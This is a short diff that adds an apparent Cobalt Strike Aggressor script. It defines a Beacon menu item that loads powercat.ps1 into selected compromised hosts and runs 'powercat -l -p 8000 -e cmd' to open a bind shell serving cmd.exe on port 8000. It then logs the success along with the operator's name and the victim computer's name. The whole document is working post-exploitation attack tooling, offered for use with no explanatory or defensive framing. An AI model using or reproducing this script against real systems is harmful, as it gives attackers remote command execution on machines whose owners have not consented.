@@ -1,0 +1,12 @@
+popup beacon_bottom {
+		menu "powercat" {
+			item "powercat -l -p 8000 -e cmd"{
+				local('$bid');
+				foreach $bid ($1){
+					bpowershell_import($bid, script_resource("powercat.ps1"));
+					bpowershell($bid, "powercat -l -p 8000 -e cmd");
+					elog("jbind shell OK " . mynick() . " on " . binfo("$bid", "computer"));
+				}
+			}
+		}
+	}
